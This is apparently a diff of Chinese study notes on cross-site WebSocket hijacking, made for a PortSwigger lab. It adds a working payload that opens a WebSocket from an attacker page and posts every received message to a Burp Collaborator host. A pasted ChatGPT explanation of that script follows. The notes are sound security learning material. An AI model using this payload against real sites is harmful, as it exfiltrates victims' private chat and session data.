@@ -8,7 +8,7 @@ websocket连接通常使用客户端JS创建，如下所示
 var ws = new WebSocket("wss://normal-website.com/chat");
 ```
 
-为了建立连接，浏览器和服务器通过HTTP执行WebSocket握手。浏览器发出WebSocket握手请求，如下所示：
+为了建立连接，浏览器和服务器**通过HTTP执行**WebSocket握手。浏览器发出WebSocket握手请求，如下所示：
 
 ```http
 GET /chat HTTP/1.1
@@ -60,7 +60,7 @@ ws.send("Peter Wiener");
 
 攻击者可以在自己的域上创建恶意网页，从而与脆弱网站建立跨站websocket连接。应用程序将受害用户与应用程序会话的上下文中处理连接。
 
-然后，攻击者的页面可以通过连接向服务器发送任意消息，并读取从服务器接受回的消息内容。这意味着，与常规CSRF不同，攻击者可以与受感染的网站双向交互。
+然后，攻击者的页面可以**通过连接向服务器发送任意消息**，**并读取从服务器接受回的消息内容**。这意味着，与常规CSRF不同，攻击者可以与受感染的网站双向交互。
 
 和找普通的CSRF攻击一样，跨站websocket劫持也需要找到一个仅依赖于HTTP cookie进行会话处理的握手消息，并且不会在请求参数中使用任何token或其他不可预测的值。
 
@@ -78,4 +78,52 @@ Upgrade: websocket
 
 > `Sec-WebSocket-Key` 包含一个随机值，以防止缓存代理时出现错误，**并且不用于身份验证或会话处理目的。**
 
-如果websocket握手请求容易受到CSRF的攻击，则攻击者的网页可以执行跨站点请求，在易受攻击的站点上打开websocket。攻击中接下来会发生什么完全取决于应用程序
+如果websocket握手请求容易受到CSRF的攻击，则攻击者的网页可以执行跨站点请求，在易受攻击的站点上打开websocket。攻击中接下来会发生什么完全取决于应用程序。
+
+>[Lab: Cross-site WebSocket hijacking ](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
+>
+>**payload**
+>
+>```solidity
+><script>
+>    var ws = new WebSocket('wss://your-websocket-url');
+>    ws.onopen = function() {
+>        ws.send("READY");
+>    };
+>    ws.onmessage = function(event) {
+>        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+>    };
+></script>
+>```
+>
+>**chatgpt**
+>
+>这个JavaScript脚本创建了一个WebSocket连接（`ws`），并定义了一些事件处理程序。以下是脚本的主要功能：
+>
+>1. WebSocket连接：
+>
+>   ```js
+>   var ws = new WebSocket('wss://0aa2006104af81dc85a2a981000c002d.web-security-academy.net/chat');
+>   ```
+>
+>   通过创建一个WebSocket对象，该对象连接到了指定的WebSocket地址 `'wss://0aa2006104af81dc85a2a981000c002d.web-security-academy.net/chat'`。这可能是与聊天服务器或实时通信相关的WebSocket地址。
+>
+>2. WebSocket打开时发送消息：
+>
+>   ```js
+>   codews.onopen = function() {
+>       ws.send("READY");
+>   };
+>   ```
+>
+>   当WebSocket连接成功打开时，通过 `ws.send("READY")` 发送了一条消息，消息内容是字符串 "READY"。
+>
+>3. WebSocket接收消息时进行处理：
+>
+>   ```js
+>   javascriptCopy codews.onmessage = function(event) {
+>       fetch('https://255nqfuua69rvyaxjt79wwei99fz3o.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
+>   };
+>   ```
+>
+>   当WebSocket接收到消息时，使用 `ws.onmessage` 事件处理程序。在这里，它通过 `fetch` API 向指定的URL `'https://255nqfuua69rvyaxjt79wwei99fz3o.burpcollaborator.net'` 发送了一条POST请求，请求体（`body`）是通过WebSocket接收到的消息（`event.data`）。
